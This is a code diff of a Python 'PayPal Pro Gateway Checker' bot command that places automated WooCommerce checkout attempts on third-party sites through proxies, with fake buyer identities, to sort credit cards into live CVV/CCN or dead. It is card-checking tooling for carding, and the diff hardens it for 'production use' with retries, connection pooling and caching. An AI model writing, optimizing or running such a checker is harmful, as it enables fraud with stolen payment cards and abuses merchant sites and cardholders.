@@ -2,23 +2,41 @@
 PayPal Pro Gateway Checker - Pure Python Implementation
 Converted from allpaypalpro.php
 Command: /pro
+
+Optimized for production use with:
+- Connection pooling via requests.Session
+- Retry logic with exponential backoff
+- Improved error handling
+- Memory-efficient operations
+- Configurable timeouts
 """
 
 import requests
+from requests.adapters import HTTPAdapter
+from urllib3.util.retry import Retry
 import re
 import random
 import string
 import time
 import json
 import os
-import tempfile
-from urllib.parse import urlencode, urlparse, parse_qs
+from functools import lru_cache
+from urllib.parse import urlencode, urlparse
 from bs4 import BeautifulSoup
-from datetime import datetime
 
 # Disable SSL warnings
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# Production configuration
+CONFIG = {
+    'timeout': 25,  # Request timeout in seconds
+    'max_retries': 2,  # Max retry attempts
+    'backoff_factor': 0.3,  # Exponential backoff factor
+    'pool_connections': 10,  # Connection pool size
+    'pool_maxsize': 20,  # Max pool size
+    'bin_cache_size': 500,  # BIN info cache size
+}
 
 
 # User agents list
@@ -205,8 +223,16 @@ def generate_random_email(fname, lname):
     return f"{fname.lower()}.{lname.lower()}@{domain}"
 
 
+@lru_cache(maxsize=CONFIG['bin_cache_size'])
 def get_bin_info(bin_number):
-    """Get BIN information from API"""
+    """Get BIN information from API with caching"""
+    default_info = {
+        'brand': 'Unknown',
+        'type': 'Unknown',
+        'level': 'Unknown',
+        'bank': 'Unknown',
+        'country': 'Unknown',
+    }
     try:
         response = requests.get(
             f'https://bins.antipublic.cc/bins/{bin_number}',
@@ -223,15 +249,37 @@ def get_bin_info(bin_number):
                 'bank': data.get('bank', 'Unknown'),
                 'country': data.get('country_name', 'Unknown'),
             }
-    except Exception as e:
+    except (requests.RequestException, json.JSONDecodeError, KeyError):
         pass
-    return {
-        'brand': 'Unknown',
-        'type': 'Unknown',
-        'level': 'Unknown',
-        'bank': 'Unknown',
-        'country': 'Unknown',
-    }
+    return default_info
+
+
+def create_session(proxies=None):
+    """Create optimized requests session with connection pooling and retry logic"""
+    session = requests.Session()
+    
+    # Configure retry strategy
+    retry_strategy = Retry(
+        total=CONFIG['max_retries'],
+        backoff_factor=CONFIG['backoff_factor'],
+        status_forcelist=[429, 500, 502, 503, 504],
+        allowed_methods=["HEAD", "GET", "POST", "OPTIONS"]
+    )
+    
+    # Configure adapter with connection pooling
+    adapter = HTTPAdapter(
+        max_retries=retry_strategy,
+        pool_connections=CONFIG['pool_connections'],
+        pool_maxsize=CONFIG['pool_maxsize']
+    )
+    
+    session.mount("http://", adapter)
+    session.mount("https://", adapter)
+    
+    if proxies:
+        session.proxies.update(proxies)
+    
+    return session
 
 
 def country_code_to_emoji(country_code):
@@ -281,17 +329,45 @@ def normalize_card_format(card_input):
     return None
 
 
-def load_sites():
-    """Load sites from sites.txt"""
+_sites_cache = None
+_sites_cache_time = 0
+SITES_CACHE_TTL = 300  # 5 minutes cache TTL
+
+
+def load_sites(force_reload=False):
+    """Load sites from sites.txt with caching"""
+    global _sites_cache, _sites_cache_time
+    
+    current_time = time.time()
+    
+    # Return cached sites if still valid
+    if not force_reload and _sites_cache is not None and (current_time - _sites_cache_time) < SITES_CACHE_TTL:
+        return _sites_cache
+    
     sites_file = os.path.join(os.path.dirname(__file__), 'sites.txt')
     sites = []
     if os.path.exists(sites_file):
-        with open(sites_file, 'r') as f:
+        with open(sites_file, 'r', encoding='utf-8') as f:
             for line in f:
                 line = line.strip()
                 if line and not line.startswith('#'):
                     sites.append(line)
+    
+    _sites_cache = sites
+    _sites_cache_time = current_time
     return sites
+
+
+def clear_sites_cache():
+    """Clear the sites cache to force reload"""
+    global _sites_cache, _sites_cache_time
+    _sites_cache = None
+    _sites_cache_time = 0
+
+
+def clear_bin_cache():
+    """Clear the BIN info cache"""
+    get_bin_info.cache_clear()
 
 
 def check_card(card_input, proxy=None, sites=None):
@@ -357,6 +433,9 @@ def check_card(card_input, proxy=None, sites=None):
                 'https': f'http://{host}:{port}',
             }
     
+    # Request timeout
+    timeout = CONFIG['timeout']
+    
     # Load sites if not provided
     if not sites:
         sites = load_sites()
@@ -382,8 +461,8 @@ def check_card(card_input, proxy=None, sites=None):
     email = generate_random_email(fname, lname)
     username = f"{fname.lower()}_{numname}"
     
-    # Create session with cookies
-    session = requests.Session()
+    # Create optimized session with connection pooling
+    session = create_session(proxies)
     
     # Headers for requests
     headers = {
@@ -406,9 +485,8 @@ def check_card(card_input, proxy=None, sites=None):
         response = session.get(
             product_page_url,
             headers=headers,
-            proxies=proxies,
             verify=False,
-            timeout=30
+            timeout=timeout
         )
         
         if response.status_code != 200:
@@ -474,9 +552,8 @@ def check_card(card_input, proxy=None, sites=None):
         response = session.get(
             final_url,
             headers=headers,
-            proxies=proxies,
             verify=False,
-            timeout=30
+            timeout=timeout
         )
         
         # Step 3: Go to checkout
@@ -484,9 +561,8 @@ def check_card(card_input, proxy=None, sites=None):
         response = session.get(
             checkout_url,
             headers=headers,
-            proxies=proxies,
             verify=False,
-            timeout=30
+            timeout=timeout
         )
         
         checkout_html = response.text
@@ -573,9 +649,8 @@ def check_card(card_input, proxy=None, sites=None):
             f"https://{hostname}/?wc-ajax=checkout",
             headers=ajax_headers,
             data=checkout_data,
-            proxies=proxies,
             verify=False,
-            timeout=30
+            timeout=timeout
         )
         
         payment_response = response.text
@@ -656,6 +731,20 @@ def check_card(card_input, proxy=None, sites=None):
             'card': card_input,
             'site': hostname if 'hostname' in locals() else 'Unknown',
         }
+    except requests.exceptions.ConnectionError:
+        return {
+            'status': 'ERROR',
+            'message': 'Connection failed',
+            'card': card_input,
+            'site': hostname if 'hostname' in locals() else 'Unknown',
+        }
+    except requests.exceptions.RequestException as e:
+        return {
+            'status': 'ERROR',
+            'message': f'Request error: {str(e)[:80]}',
+            'card': card_input,
+            'site': hostname if 'hostname' in locals() else 'Unknown',
+        }
     except Exception as e:
         return {
             'status': 'ERROR',
@@ -663,6 +752,12 @@ def check_card(card_input, proxy=None, sites=None):
             'card': card_input,
             'site': hostname if 'hostname' in locals() else 'Unknown',
         }
+    finally:
+        # Clean up session resources
+        try:
+            session.close()
+        except:
+            pass
 
 
 def format_result(result):
@@ -671,43 +766,47 @@ def format_result(result):
     approved = result.get('approved', False)
     message = result.get('message', 'Unknown')
     card = result.get('card', 'Unknown')
-    site = result.get('site', 'Unknown')
-    price = result.get('price', 'N/A')
     time_taken = result.get('time', 'N/A')
     bin_info = result.get('bin_info', {})
-    receipt = result.get('receipt', '')
     
-    status_emoji = '✅' if approved else '❌'
+    # Format time - extract just the number for cleaner display
+    time_display = time_taken.replace('s', ' 𝘀𝗲𝗰𝗼𝗻𝗱𝘀')
     
-    if status == 'CVV':
-        status_text = f"#CVV {status_emoji}"
-    elif status == 'CCN':
-        status_text = f"#CCN {status_emoji}"
-    elif status == 'DECLINED':
-        status_text = f"#DEAD ❌"
+    # Build BIN info line
+    bin_parts = []
+    if bin_info.get('brand') and bin_info.get('brand') != 'Unknown':
+        bin_parts.append(bin_info['brand'])
+    if bin_info.get('type') and bin_info.get('type') != 'Unknown':
+        bin_parts.append(bin_info['type'])
+    if bin_info.get('level') and bin_info.get('level') != 'Unknown':
+        bin_parts.append(bin_info['level'])
+    if bin_info.get('country') and bin_info.get('country') != 'Unknown':
+        bin_parts.append(bin_info['country'])
+    bin_info_str = ' - '.join(bin_parts) if bin_parts else 'Unknown'
+    
+    bank_str = bin_info.get('bank', 'Unknown')
+    
+    # Format for CVV, CCN, and DECLINED statuses
+    if status in ('CVV', 'CCN', 'DECLINED'):
+        result_text = f"""𝗖𝗖 ⇾ {card}
+𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Paypal Pro
+𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {message}
+
+𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info_str}
+𝗕𝗮𝗻𝗸: {bank_str}
+
+𝗧𝗼𝗼𝗸 {time_display}
+
+𝗕𝗼𝘁 𝗯𝘆 : @TUMAOB"""
     else:
-        status_text = f"#ERROR ❌"
-    
-    result_text = f"""
-{status_text}
+        # ERROR status - keep minimal format
+        result_text = f"""#ERROR ❌
 
 𝗖𝗖 ⇾ {card}
-𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ PayPal Pro
+𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Paypal Pro
 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {message}
-𝗔𝗺𝗼𝘂𝗻𝘁 ⇾ {price}
 
-𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'Unknown')} - {bin_info.get('type', 'Unknown')} - {bin_info.get('level', 'Unknown')}
-𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'Unknown')}
-𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'Unknown')}
-
-𝗧𝗼𝗼𝗸 {time_taken}
-𝗦𝗶𝘁𝗲: {site}
-
-𝗕𝗼𝘁 𝗯𝘆 : @TUMAOB
-"""
-    
-    if receipt:
-        result_text += f"\n𝗥𝗲𝗰𝗲𝗶𝗽𝘁: {receipt}"
+𝗕𝗼𝘁 𝗯𝘆 : @TUMAOB"""
     
     return result_text.strip()
 
